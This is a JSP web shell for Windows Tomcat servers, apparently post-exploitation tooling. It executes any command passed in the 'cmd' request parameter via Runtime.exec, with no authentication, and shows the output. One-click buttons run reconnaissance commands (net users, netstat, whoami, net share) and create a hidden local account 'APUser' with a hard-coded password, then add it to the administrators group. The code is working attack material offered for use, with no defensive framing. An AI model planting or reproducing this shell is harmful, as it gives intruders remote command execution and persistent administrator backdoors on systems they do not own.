<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="content-type">
  <title>Windows Tomcat Javascript Command Page</title>
</head>
<script>
	function runWinCommand(command_to_run) {
			document.formWindowsCommand.cmd.value = command_to_run; 
			document.formWindowsCommand.submit(); 
		} 
	function runWindowsSearch() {
			fname = document.formSearchCommand.filename.value;
			document.formSearchCommand.cmd.value = 'dir /s *' + fname + '*'; 
			document.formSearchCommand.submit(); 
		}
		
</script>

<%@ page import="java.io.*" %>
<style>
	.pagecontainer{
	 width: 100%;
	 height: 100%;
	 background : #CCCCCC;
	 
	}
	.wrapper {
    width: 100%;
    height: 50px;
    background : #464646;
    background : -webkit-gradient(linear, left top, left bottom, from(rgb(168,168,168)), to(rgb(69,69,69)));
    background : -moz-linear-gradient(top, rgb(168,168,168), rgb(69,69,69));
    border-top: 2px solid #939393;
    position: relative;
    margin-bottom: 5px;
	}
	.title{
	position:absolute;
	right:20px;
	top:10px;
	font-size:18px;
	text-transform:uppercase;
	}
	
	.container{
	width:100%;
	margin:0 
	auto;
	}
	.menu{
	height:40px;
	border-left:1px solid rgba(0,0,0,0.3);
	border-right:1px solid rgba(255,255,255,0.3);
	float:left;
	}
	
	a {
	text-decoration:none;
	color:#363636;
	text-transform:uppercase;
	font-size:12px;
	font-weight:bold;}
	
	.pgTitle {
	text-decoration:none;
	color:#FFFFFF;
	text-transform:uppercase;
	font-size:16px;
	font-weight:bold;
    background : #464646;
    background : -webkit-gradient(linear, left top, left bottom, from(rgb(168,168,168)), to(rgb(69,69,69)));
    background : -moz-linear-gradient(top, rgb(168,168,168), rgb(69,69,69));
    border-top: 2px solid #939393;
    position: relative;
	margin-bottom: 5px; 
	padding-left: 10px;
   	}
	
	ul {
    margin: 0;
    padding: 0;
	}
 
	ul.menu {
    height: 40px;
    border-left: 1px solid rgba(0,0,0,0.3);
    border-right: 1px solid rgba(255,255,255,0.3);
    padding-left: 10px;
	}
 
	ul.menu li {
    list-style: none;
    float:left;
    height: 50px;
    text-align: center;
    background: -webkit-gradient(radial, 50% 100%, 10, 50% 50%, 90, from(rgba(31,169,244,1)), to(rgba(0,28,78, 1)) );
    background: -moz-radial-gradient(center 80px 45deg, circle cover, rgba(31,169,244,1) 0%, rgba(0,28,78, 1) 100%);
    }
 
	ul li a {
    display: block;
    padding: 0 5px;
    border-left: 1px solid rgba(255,255,255,0.1);
    border-right: 1px solid rgba(0,0,0,0.1);
    text-align: center;
    line-height: 50px;
    background : -webkit-gradient(linear, left top, left bottom, from(rgb(168,168,168)), to(rgb(69,69,69)));
    background : -moz-linear-gradient(top, rgb(168,168,168), rgb(69,69,69));
    -webkit-transition-property: background;
    -webkit-transition-duration: 700ms;
    -moz-transition-property: background;
    -moz-transition-duration: 700ms;
    }
	.results {
		float: left;
		
		border-style: solid;
		border-width: 1px; 
		border-color: #999999; 
		background-color: #EEEEEE;
		padding: 10px;
		margin: 125px;
		}
	ul li a:hover {
    background: transparent none;
	}
 
	ul li.active a{
    background: -webkit-gradient(radial, 50% 100%, 10, 50% 50%, 90, from(rgba(31,169,244,1)), to(rgba(0,28,78, 1)) );
    background: -moz-radial-gradient(center 80px 45deg, circle cover, rgba(31,169,244,1) 0%, rgba(0,28,78, 1) 100%);
	}
	ul.vertical{
	margin:0 20px 0 0;
	width:250px;
	border:1px solid #323232;
	-webkit-border-top-right-radius:8px;
	-moz-border-radius-topright:8px;-webkit-border-bottom-right-radius:8px;
	-moz-border-radius-bottomright:8px;}ul.vertical li{list-style:none;position:relative;
	background:-webkit-gradient(radial,50% 100%,0,50% 100%,140,from(rgba(31,169,244,1)),to(rgba(0,28,78,1)));
	background:-moz-radial-gradient(center 80px 45deg,circle cover,rgba(31,169,244,1) 0%,rgba(0,28,78,1) 100%);
	}
	ul.vertical li span{
	position:absolute;left:20px;top:50px;
	color:#151515;text-shadow:0 1px 1px rgba(255,255,255,0.2);
	}
	ul.vertical li:first-child a,ul.vertical li:first-child{
	-webkit-border-top-right-radius:8px;-moz-border-radius-topright:8px;
	}
	ul.vertical li:last-child a,ul.vertical li:last-child{
	-webkit-border-bottom-right-radius:8px;-moz-border-radius-bottomright:8px;
	}
	ul.vertical li a{
	background:-webkit-gradient(linear,left top,left bottom,from(rgba(117,117,117,1)),to(rgba(68,68,68,1)));
	background:-moz-linear-gradient(top,rgba(117,117,117,1),rgba(68,68,68,1));
	text-align:left;border-bottom:1px solid #323232;
	border-top:1px solid #868686;
	border-right:1px solid #5a5a5a;
	color:#151515;-webkit-transition-property:background;
	-webkit-transition-duration:700ms;-moz-transition-property:background;
	-moz-transition-duration:700ms;
	}
	ul.vertical li a:hover{
	background:transparent none;
	}
	ul.vertical[rel=ver1] li a{
	background:#606060;
	}
	ul.vertical[rel=ver1] li a:hover{
	background:transparent none;
	}

</style>
<body class="pagecontainer">
<div class="pgTitle">
Server Information: OS: <% out.println(System.getProperty("os.name")); %> | Architecture:  <% out.println(System.getProperty("os.arch")); %> | Source IP Addres: <% out.println(request.getRemoteAddr());%>
</div>
<div name="leftmenu" style="float:left;">
<ul class="vertical fl">
	<li><a href="#" onclick="runWinCommand('net users')" name="cmdusers">View Users</a></li>
	<li><a href="#" onclick="runWinCommand('netstat -n')" name="cmdnetstat">Run Netstat</a></li>
	<li><a href="#" onclick="runWinCommand('net accounts')" name="cmduserAcctInfo">User Account Information</a></li>
	<li><a href="#" onclick="runWinCommand('net sessions')" name="cmdSessions">View Sessions</a></li>
	<li><a href="#" onclick="runWinCommand('net share')" name="cmdShares">View Shares</a></li>
	<li><a href="#" onclick="runWinCommand('ipconfig /all')" name="cmdIpconfig">IPConfig</a></li>
	<li><a href="#" onclick="runWinCommand('whoami')" name="cmdWhoami">Current User</a></li>
	<li><a href="#" onclick="runWinCommand('tree /a')" name="cmdTree">View Directory Tree</a></li>
	<li><a href="#" onclick="runWinCommand('tree /a /f')" name="cmdTree">View Directory w/Files</a></li>
	<li><a href="#" onclick="runWinCommand('net user APUser newYear!2015 /add')" name="cmduseradd">Add APUser</a></li>
	<li><a href="#" onclick="runWinCommand('net localgroup administrators APUser /add')" name="cmdgroupadd">Add APUser to Admin Group</a></li>
	<li><a href="#" onclick="runWinCommand('net user APUser /delete')" name="cmddeluser">Remove APUser</a></li>
</ul>
</div>
<div>
		<form target="_self" method="get" action="index.jsp" name="formManualCommand">Enter a command to run:
		<input type='text'name="cmd" size='50'><input type='submit'value='Run'>
		</form>
		<form target="_self" method="get" action="index.jsp" name="formWindowsCommand">
			<input type="hidden" name="cmd" value = "" >
		</form>	
</div>
<div name="rightmenu" style="float:left">
<%
   String cmd = request.getParameter("cmd");
   String output = ""; 

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s + "\n"; 
         }
		if (output.length() > 1) { 
			out.println("<h3>Results</h3>");
			out.println("<div>Results for command<i> " + cmd + " </i><pre>");
			out.println(output); 
			out.println("</pre></div><hr>");
		} else { 
			out.println("<h4>No Results Returned for command <i>" + cmd + "</i></h4><hr>");
			}
		
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>
</div>
</body>
</html>
